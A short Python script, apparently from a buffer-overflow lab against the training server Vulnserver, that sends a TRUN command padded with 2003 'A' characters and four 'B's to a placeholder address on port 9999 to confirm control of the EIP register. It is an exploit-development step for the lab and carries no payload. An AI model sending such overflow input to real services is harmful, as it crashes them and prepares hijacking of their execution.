#!/usr/bin/python3

import sys, socket 

#Sending 2003 As to identify where the EIP starts based on the offset we found finding the offset, then validating that teh EIP reads [42424242]
shellcode = "A" * 2003 + "B" * 4

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('111.222.333.444', 9999))
	
	payload = "TRUN /.:/" + shellcode
	
	s.send((payload.encode())) 
	s.close()
		
except:
	print ("Error Connecting to Server")
	sys.exit()
